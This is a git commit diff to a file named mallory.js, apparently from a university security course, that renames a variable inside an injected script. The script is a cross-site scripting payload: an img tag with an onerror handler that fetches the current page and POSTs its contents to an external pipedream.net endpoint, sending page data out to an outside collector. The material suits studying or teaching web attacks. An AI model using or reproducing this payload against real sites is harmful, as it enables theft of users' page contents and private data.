8c987d3363634ca3791ef03fc61270ac2f2d6f5d
Natasha Timothy <natashatimothy@n-macbook-air.wifi.local.cmu.edu>
2024-03-20 00:23:20 -0400

    update

--- mallory.js
+++ mallory.js
@@ -2,11 +2,11 @@ document.addEventListener('DOMContentLoaded', function(){
   document.title = "<img src/ onerror=\
       'fetch(document.URL)\
       .then(response => response.text())\
-      .then(responseText => \
+      .then(text => \
           fetch(\"https://eol8hwg1v5ylu2h.m.pipedream.net\",\
           { \
               method: \"POST\", \
-              body: responseText \
+              body: text \
           })\
       );'>";
 });
